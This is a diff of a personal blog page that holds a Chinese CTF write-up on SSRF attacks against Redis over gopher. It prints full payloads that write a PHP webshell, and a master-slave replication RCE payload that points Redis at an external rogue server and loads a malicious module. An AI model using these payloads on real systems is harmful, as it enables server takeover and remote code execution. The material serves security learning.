@@ -1,5 +1,234 @@
-<!doctype html>
-<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>ssrf中gopher+redis的利用总结 - Hexo</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Hexo"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hexo"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="crontab只能在Centos上使用，原因： 1.redis默认写入文件的权限为644，而ubuntu要求执行定时任务文件&amp;#x2F;var&amp;#x2F;spool&amp;#x2F;cron&amp;#x2F;crontabs&amp;#x2F;&amp;lt;username&amp;gt;权限必须是600，否则会报错。而Centos的定时任务文件&amp;#x2F;var&amp;#x2F;spool&amp;#x2F;cron&amp;#x2F;&amp;lt;username&amp;gt;权限644也可执行。 2.因为redis保存RDB会存在乱码，在Ubun"><meta property="og:type" content="blog"><meta property="og:title" content="ssrf中gopher+redis的利用总结"><meta property="og:url" content="http://example.com/2021/04/26/ssrf%E4%B8%ADgopher-redis%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="crontab只能在Centos上使用，原因： 1.redis默认写入文件的权限为644，而ubuntu要求执行定时任务文件&amp;#x2F;var&amp;#x2F;spool&amp;#x2F;cron&amp;#x2F;crontabs&amp;#x2F;&amp;lt;username&amp;gt;权限必须是600，否则会报错。而Centos的定时任务文件&amp;#x2F;var&amp;#x2F;spool&amp;#x2F;cron&amp;#x2F;&amp;lt;username&amp;gt;权限644也可执行。 2.因为redis保存RDB会存在乱码，在Ubun"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.hualigs.cn/image/6086b21e53d31.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/6086b21e63d5c.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/6086b21e6139f.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/6086b21e55ef0.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/6086b21e568de.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/6086b21e71a9a.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/6086b21e662b0.jpg"><meta property="og:image" content="https://www.hualigs.cn/image/6086b21e68121.jpg"><meta property="article:published_time" content="2021-04-26T12:28:50.000Z"><meta property="article:modified_time" content="2021-04-26T12:31:31.897Z"><meta property="article:author" content="John Doe"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://www.hualigs.cn/image/6086b21e53d31.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2021/04/26/ssrf%E4%B8%ADgopher-redis%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"},"headline":"Hexo","image":["https://www.hualigs.cn/image/6086b21e53d31.jpg","https://www.hualigs.cn/image/6086b21e63d5c.jpg","https://www.hualigs.cn/image/6086b21e6139f.jpg","https://www.hualigs.cn/image/6086b21e55ef0.jpg","https://www.hualigs.cn/image/6086b21e568de.jpg","https://www.hualigs.cn/image/6086b21e71a9a.jpg","https://www.hualigs.cn/image/6086b21e662b0.jpg","https://www.hualigs.cn/image/6086b21e68121.jpg"],"datePublished":"2021-04-26T12:28:50.000Z","dateModified":"2021-04-26T12:31:31.897Z","author":{"@type":"Person","name":"John Doe"},"description":"crontab只能在Centos上使用，原因： 1.redis默认写入文件的权限为644，而ubuntu要求执行定时任务文件&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;&lt;username&gt;权限必须是600，否则会报错。而Centos的定时任务文件&#x2F;var&#x2F;spool&#x2F;cron&#x2F;&lt;username&gt;权限644也可执行。 2.因为redis保存RDB会存在乱码，在Ubun"}</script><link rel="canonical" href="http://example.com/2021/04/26/ssrf%E4%B8%ADgopher-redis%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-26T12:28:50.000Z" title="2021-04-26T12:28:50.000Z">2021-04-26</time>发表</span><span class="level-item"><time dateTime="2021-04-26T12:31:31.897Z" title="2021-04-26T12:31:31.897Z">2021-04-26</time>更新</span><span class="level-item">10 分钟读完 (大约1560个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">ssrf中gopher+redis的利用总结</h1><div class="content"><h1 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h1><p>只能在Centos上使用，原因：</p>
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sp4z">
+  <meta name="keywords" content="">
+  
+  <title>ssrf中gopher+redis的利用总结 - sp4z&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="ssrf中gopher+redis的利用总结">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-04-26 20:28" pubdate>
+        2021年4月26日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      43
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ssrf中gopher+redis的利用总结</h1>
+            
+            <div class="markdown-body">
+              <h1 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h1><p>只能在Centos上使用，原因：</p>
 <p>1.redis默认写入文件的权限为644，而ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600，否则会报错。而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也可执行。</p>
 <p>2.因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</p>
 <p>3.不同系统中crontrab定时文件位置也会不同Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code>，Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> ，高版本的redis默认启动是<code>redis</code>权限，所以无法利用。</p>
@@ -36,7 +265,7 @@
 <p>利用<code>dict://</code>访问6379端口，存在redis，前面给出了密码为root</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;cb0f5ef6-1668-4620-a764-3af2cac0b19b.node3.buuoj.cn&#x2F;?url&#x3D;dict:&#x2F;&#x2F;0.0.0.0:6379</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://www.hualigs.cn/image/6086b21e53d31.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/6086b21e53d31.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>利用gopher协议，生成payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell\Desktop</span><br><span class="line">&gt; python2 G:\工具\ssrf工具\gopherwriteshell2.py</span><br><span class="line">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure>
 
@@ -52,7 +281,7 @@
 
 
 <p>写入成功，得到flag</p>
-<p><img src="https://www.hualigs.cn/image/6086b21e63d5c.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/6086b21e63d5c.jpg" srcset="/img/loading.gif" lazyload></p>
 <h1 id="主从复制rce"><a href="#主从复制rce" class="headerlink" title="主从复制rce"></a>主从复制rce</h1><p>在docker环境下，一个单一的容器中不会有除redis以外的任何服务存在，如ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下可以利用主从复制执行命令。</p>
 <p><strong>主从复制概念</strong></p>
 <p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。建立主从关系只需要在从节点操作就行了，主节点不用任何操作。</p>
@@ -60,66 +289,215 @@
 <p>Redis是一个使用ANSI  C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
 <h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>还是以[网鼎杯 2020 玄武组]SSRFMe为例</p>
 <p>需要先下载两个工具</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a> </p>
-<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<p><a href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a> </p>
+<p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
 <p>实际用到的只有第一个链接中的<code>rogue-server.py</code>和<code>ssrf-redis.py</code>，还有第二个链接中的<code>exp.so</code>，把这三个文件放到一个文件夹里即可</p>
 <p>修改ssrf-redis.py中的一些参数</p>
 <p>lhost改为vps地址，6666端口为<code>rogue-server.py</code>的运行端口，command为要执行的命令</p>
-<p><img src="https://www.hualigs.cn/image/6086b21e6139f.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/6086b21e6139f.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>ip改为符合要求的0.0.0.0</p>
-<p><img src="https://www.hualigs.cn/image/6086b21e55ef0.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/6086b21e55ef0.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>密码改为root</p>
-<p><img src="https://www.hualigs.cn/image/6086b21e568de.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/6086b21e568de.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>生成payload</p>
-<p><img src="https://www.hualigs.cn/image/6086b21e71a9a.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/6086b21e71a9a.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>运行rogue-server.py，建立从节点</p>
-<p><img src="https://www.hualigs.cn/image/6086b21e662b0.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/6086b21e662b0.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>将生成的payload进行url编码后访问，得到flag</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;44677c4e-0255-433c-aa69-f1ebedb79c08.node3.buuoj.cn&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_%25%32%41%32%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%41%55%54%48%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%72%6f%6f%74%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%37%25%30%44%25%30%41%53%4c%41%56%45%4f%46%25%30%44%25%30%41%25%32%34%31%35%25%30%44%25%30%41%31%31%38%2e%31%39%35%2e%31%36%36%2e%31%33%38%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%36%36%36%36%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%43%4f%4e%46%49%47%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%53%45%54%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%64%69%72%25%30%44%25%30%41%25%32%34%35%25%30%44%25%30%41%2f%74%6d%70%2f%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%30%25%30%44%25%30%41%64%62%66%69%6c%65%6e%61%6d%65%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%4d%4f%44%55%4c%45%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%4c%4f%41%44%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%2f%74%6d%70%2f%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%32%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%73%79%73%74%65%6d%2e%65%78%65%63%25%30%44%25%30%41%25%32%34%31%34%25%30%44%25%30%41%63%61%74%25%32%34%25%37%42%49%46%53%25%37%44%2f%66%6c%61%67%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%71%75%69%74%25%30%44%25%30%41</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://www.hualigs.cn/image/6086b21e68121.jpg"></p>
-</div><div class="article-licensing box"><div class="licensing-title"><p>ssrf中gopher+redis的利用总结</p><p><a href="http://example.com/2021/04/26/ssrf%E4%B8%ADgopher-redis%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">http://example.com/2021/04/26/ssrf%E4%B8%ADgopher-redis%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>John Doe</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-04-26</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-04-26</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="notification is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/" alt="支付宝"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>送我杯咖啡</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><div class="notification is-danger">You forgot to set the <code>business</code> or <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.</div><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/04/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-CommonsCollections3-1/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">java反序列化学习-CommonsCollections3.1</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/04/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="level-item">FastJson反序列化</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div class="notification is-danger">You forgot to set the <code>shortname</code> for Disqus. Please set it in <code>_config.yml</code>.</div></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://i.loli.net/2021/04/15/mxulK15prYAkXbI.png" alt="Sp4z"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Sp4z</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">45</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-30T07:20:41.000Z">2021-05-30</time></p><p class="title"><a href="/2021/05/30/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Shiro-550反序列化漏洞分析</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-28T04:36:53.000Z">2021-05-28</time></p><p class="title"><a href="/2021/05/28/ESP%E5%AE%9A%E5%BE%8B%E5%92%8C%E5%8A%A8%E6%80%81%E8%84%B1UPX%E5%A3%B3/">ESP定律和动态脱UPX壳</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-23T06:38:50.000Z">2021-05-23</time></p><p class="title"><a href="/2021/05/23/Servlet%E5%AD%A6%E4%B9%A0/">Servlet学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-18T06:04:20.000Z">2021-05-18</time></p><p class="title"><a href="/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">CISCN2021 web部分题解</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-14T10:17:39.000Z">2021-05-14</time></p><p class="title"><a href="/2021/05/14/MRCTF2020-EzpopRevenge/">MRCTF2020-EzpopRevenge</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/11/"><span class="level-start"><span class="level-item">十一月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in 